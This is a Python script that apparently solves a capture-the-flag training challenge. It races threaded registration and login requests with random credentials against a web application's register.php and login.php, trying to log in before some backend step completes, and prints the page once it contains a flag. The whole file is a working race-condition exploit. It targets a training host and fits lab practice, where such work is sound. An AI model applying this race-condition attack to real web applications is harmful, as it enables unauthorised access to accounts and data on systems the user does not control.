import sys
import requests
from time import sleep
from threading import Thread
import string
import random

URL = "http://meta.training.jinblack.it/"


def id_generator(size=8, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def register(user, password):
    target = '{}/register.php'.format(URL)
    data = {
        "username": user,
        "password_1": password,
		"password_2": password,
		# backend checks if this is set
		"reg_user": "1"
    }
    r = requests.post(target, data=data)
    #print(r)
    if "Registration Completed!" in r.text:
        return True
    else:
        return False


def login(user, password):
    s = requests.Session()
    target = '{}/login.php'.format(URL)
    target2 = '{}/index.php'.format(URL)
    data = {
        "username": user,
        "password": password,
		# backend checks if this is set
		"log_user": 1
    }
    r = s.post(target, data=data)
    #print(r)

    if 'Login Completed!' in r.text:
        r2 = s.get(target2)
        if 'flag' in r2.text:
            print(r2.text)
            sys.exit(0)


while True:
    user = id_generator()
    password = id_generator()

    reg_thread = Thread(target=register, args=(user, password))
    log_thread = Thread(target=login, args=(user, password))

    reg_thread.start()
    log_thread.start()

    sleep(.05)
